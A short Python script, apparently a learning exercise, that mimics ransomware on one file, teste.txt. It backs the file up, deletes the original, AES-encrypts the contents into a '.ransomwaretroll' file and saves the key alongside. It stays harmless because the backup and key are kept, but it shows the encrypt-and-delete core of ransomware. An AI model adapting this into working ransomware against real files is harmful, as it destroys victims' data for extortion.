import os
import pyaes
import secrets


def gerar_chave():
    return secrets.token_bytes(16)


def criptografar_arquivo(file_name):
   
    if not os.path.exists(file_name):
        print(f"Erro: O arquivo {file_name} não existe.")
        return

   
    with open(file_name, "rb") as file:
        file_data = file.read()

   
    backup_file = file_name + ".bak"
    with open(backup_file, "wb") as backup:
        backup.write(file_data)
    print(f"Backup do arquivo criado: {backup_file}")


    os.remove(file_name)

  
    key = gerar_chave()
    aes = pyaes.AESModeOfOperationCTR(key)

  
    crypto_data = aes.encrypt(file_data)

    
    new_file = file_name + ".ransomwaretroll"
    with open(new_file, "wb") as new_file_obj:
        new_file_obj.write(crypto_data)

  
    chave_file = file_name + ".key"
    with open(chave_file, "wb") as key_file:
        key_file.write(key)

    print(f"Arquivo criptografado salvo como: {new_file}")
    print(f"A chave de criptografia foi salva em: {chave_file}")

file_name = "teste.txt"  
criptografar_arquivo(file_name)
